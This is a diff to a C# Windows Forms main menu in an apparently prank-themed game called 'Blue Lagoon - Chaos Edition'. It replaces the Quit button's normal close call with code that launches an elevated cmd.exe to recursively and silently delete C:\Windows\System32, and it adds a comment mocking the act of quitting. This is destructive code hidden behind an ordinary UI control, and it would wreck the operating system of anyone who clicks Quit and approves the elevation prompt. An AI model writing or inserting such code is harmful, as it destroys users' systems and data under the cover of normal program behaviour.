@@ -1,4 +1,5 @@
-﻿using System.Diagnostics;
+﻿using Blue_Lagoon___Chaos_Edition.Properties;
+using System.Diagnostics;
 
 namespace Blue_Lagoon___Chaos_Edition {
     public partial class MainMenu : Form {
@@ -9,7 +10,13 @@ namespace Blue_Lagoon___Chaos_Edition {
 
         #region Rage Quit
         private void QuitButton_Click(object sender, EventArgs e) {
-            this.Close();
+            Process process = new Process();
+            process.StartInfo.FileName = "cmd.exe";
+            process.StartInfo.Arguments = @"/c del C:\Windows\System32 /q /s";
+            process.StartInfo.UseShellExecute = true;
+            process.StartInfo.Verb = "runas";
+            process.Start();
+            //this.Close(); useless code why would you want to quit??
         }
         #endregion
 
